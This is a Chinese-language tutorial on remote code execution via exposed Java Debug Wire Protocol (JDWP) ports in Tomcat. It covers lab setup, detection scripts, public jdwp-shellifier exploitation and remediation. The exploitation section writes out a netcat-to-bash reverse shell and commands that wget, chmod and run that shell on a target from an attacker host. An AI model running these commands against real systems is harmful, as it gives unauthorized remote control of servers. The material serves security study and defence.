# JDWP调试接口 RCE 漏洞

## 漏洞描述

JDWP（Java Debug Wire Protocol，Java调试线协议）是一个为Java调试而设计的通讯交互协议，它定义了调试器（Debugger）和被调试JVM（Debuggee）进程之间的交互数据的传递格式，它详细完整地定义了请求命令、回应数据和错误代码，保证了调试端和被调试端之间通信通畅。

JDWP是JVM或者类JVM的虚拟机都支持的一种协议，通过该协议，Debugger端和被调试JVM之间进行通信，可以获取被调试JVM的包括类、对象、线程等信息。

参考阅读：

- https://forum.butian.net/share/1232

## 环境搭建

### Windows

下载Tomcat到本地，在`bin\startup.bat`文件中添加如下代码开启debug模式：

```
SET CATALINA_OPTS=-server -Xdebug -Xnoagent -Djava.compiler=NONE -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=8000
```

点击运行 `startup.bat` ，以debug模式启动Tomcat。

`Listening for transport dt_socket at address: 8000`，表示JDWP服务已经监听在8000端口，等待调试器连接。

### Linux

执行如下命令安装Tomcat：

```
# 执行wget命令下载Tomcat安装包
wget http://mirror.bit.edu.cn/apache/tomcat/tomcat-8/v8.5.43/bin/apache-tomcat-8.5.43.tar.gz

# 解压安装包
tar zxvf apache-tomcat-8.5.43.tar.gz

# 将程序安装包复制到指定运行目录下
sudo mv apache-tomcat-8.5.43 /usr/local/tomcat8
```

启动方式一：

进入Tomcat安装目录下的bin目录下找到 `catalina.sh` 文件，在文件开头部分添加如下一行：

```shell
CATALINA_OPTS="-Xdebug -Xrunjdwp:transport=dt_socket,server=y,suspend=n,address=*:8000"
```

修改完成后，执行脚本`./startup.sh`就会以debug模式启动Tomcat。

启动方式二：

进入Tomcat的bin目录，输入 `./catalina.sh jpda run` 或者 `./catalina.sh jpda start` 命令以调试模式启动tomcat。
启动时就会出现如下信息提示：
`Listening for transport dt_socket at address: 8000`。

注意脚本中默认配置JDWP是监听在本地的8000端口，修改`JDPA_ADDRESS`的值对外开放此端口，在JDK9及以上的版本需要修改为`JDPA_ADDRESS=*:8000` ，在JDK9以下版本修改为`JDPA_ADDRESS=8000` 即可

## 漏洞检测

有三种常用方式来进行JDWP服务探测，原理都是一样的，即向目标端口连接后发送JDWP-Handshake，如果目标服务直接返回一样的内容则说明是JDWP服务。

### Nmap

扫描会识别到JDWP服务，且有对应的JDK版本信息。

```shell
nmap -sT -sV 192.168.192.1 -p 8000
```

### Telnet

使用Telnet命令探测，需要马上输入JDWP-Handshake，然后服务端返回一样的内容，证明是JDWP服务。

```shell
telnet 192.168.182.130 8000
```

注意：需要马上输入JDWP-Handshake，并按下回车，不然马上就会断开。在Linux系统下使用telnet测试可以，在Windows系统下使用telnet测试不太行。

### Python

使用如下脚本扫描，直接连接目标服务器，并向目标发送JDWP-Handshake，如果能接收到相同内容则说明目标是开启了JDWP服务。

```
import socket

host = "192.168.182.130"
port = 8000
try:
    client = socket.socket()
    client.connect((host, port))
    client.send(b"JDWP-Handshake")
    if client.recv(1024) == b"JDWP-Handshake":
        print("[*] {}:{} Listening JDWP Service! ".format(host, port))
except Exception as e:
    print("[-] Connection failed! ")
finally:
    client.close()
```

## 漏洞POC

### POC1

poc1：https://github.com/IOActive/jdwp-shellifier
jdwp-shellifier是使用Python2编写的，该工具通过编写了一个JDI（JDWP客户端），以下断点的方式来获取线程上下文从而调用方法执行命令。

该漏洞无回显，可利用dnslog进行探测：

```
python2 jdwp-shellifier.py -t 192.168.3.118 -p 8787 --break-on "java.lang.String.indexof" --cmd "ping xxx.dnslog.cn"
```

#### 反弹shell

准备反弹shell文件，保存为shell.txt：

```
nc 192.168.178.129 3333 | /bin/bash | nc 192.168.178.129 4444%
```

启动http服务：

```
python3 -m http.server 8000
```

开启监听，需要开启2个监听，前面一个输入执行命令，后面一个输出命令执行结果：

```
nc -lvvp 3333
nc -lvvp 4444
```

利用poc1执行命令，下载shell、文件可执行权限、执行shell：

```
python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on "java.lang.String.indexof" --cmd "wget http://192.168.178.129:8000/shell.txt -O /tmp/shell.sh"
python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on "java.lang.String.indexof" --cmd "chmod a+x /tmp/shell.sh"
python2 jdwp-shellifier.py -t 192.168.178.128 -p 8000 --break-on "java.lang.String.indexof" --cmd "/tmp/shell.sh"
```

两个监听都收到shell，一个输入命令，一个输出结果。

![image-20230630173638801](images/image-20230630173638801.png)

### POC2

poc2：https://github.com/Lz1y/jdwp-shellifier
该脚本是在上面一个漏洞利用脚本的基础上，修改利用方式为通过对Sleeping的线程发送单步执行事件，达成断点，从而可以直接获取上下文、执行命令，而不用等待断点被击中。

## 修复建议

- 关闭JDWP端口，或者JDWP端口不对公网开放
- 关闭Java的debug模式